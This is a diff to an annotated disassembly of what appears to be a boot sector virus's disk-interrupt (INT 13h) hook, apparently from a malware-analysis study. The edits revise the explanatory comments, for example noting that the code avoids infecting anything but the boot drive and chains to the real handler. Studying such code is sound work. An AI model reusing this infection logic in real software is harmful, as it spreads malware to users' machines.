@@ -39,7 +39,7 @@ seg000:7C0E    ; ---------------------------------------------------------------
 seg000:7C0E    push ds                                                                       | push ds onto stack
 seg000:7C0F    push ax                                                                       | push ax onto stack
 seg000:7C10    or dl, dl                                                                     | dl OR dl
-seg000:7C12    jnz short loc_7C2F                                                            | jump if dl != 0: dl tells us what drive the caller is targeting
+seg000:7C12    jnz short loc_7C2F                                                            | jump if dl != 0: dl tells us what drive the caller is targeting; dont't infect anything but boot drive
 seg000:7C14    xor ax, ax                                                                    | clear ax
 seg000:7C16    mov ds, ax                                                                    | clear ds
 seg000:7C18    test byte ptr ds:43Fh, 1                                                      | check if any drive motor running
@@ -47,18 +47,18 @@ seg000:7C1D    jnz short loc_7C2F                                               
 seg000:7C1F    pop ax                                                                        | pop ax
 seg000:7C20    pop ds                                                                        | pop ds
 seg000:7C21    pushf                                                                         | push EFLAGS onto stack
-seg000:7C22    call dword ptr cs:0Ah                                                         | go back to checking drive motor
+seg000:7C22    call dword ptr cs:0Ah                                                         | do real int13
 seg000:7C27    pushf                                                                         | 
 seg000:7C28    call sub_7C36                                                                 | 
 seg000:7C2B    popf                                                                          | 
 seg000:7C2C    retf 2                                                                        | 
-seg000:7C2F    ; --------------------------------------------------------------------------- | kinda seems like an infinite loop, but IT AINT
+seg000:7C2F    ; --------------------------------------------------------------------------- | 
 seg000:7C2F                                                                                  | 
 seg000:7C2F    loc_7C2F: ; CODE XREF: seg000:7C12j                                           | 
 seg000:7C2F    ; seg000:7C1Dj                                                                | 
 seg000:7C2F    pop ax                                                                        | pop ax
 seg000:7C30    pop ds                                                                        | pop ds
-seg000:7C31    jmp dword ptr cs:0Ah                                                          | jmp back to checking drive motor
+seg000:7C31    jmp dword ptr cs:0Ah                                                          | jmp to real int13 handler
 seg000:7C36                                                                                  | 
 seg000:7C36    ; =============== S U B R O U T I N E ======================================= | 
 seg000:7C36                                                                                  | 
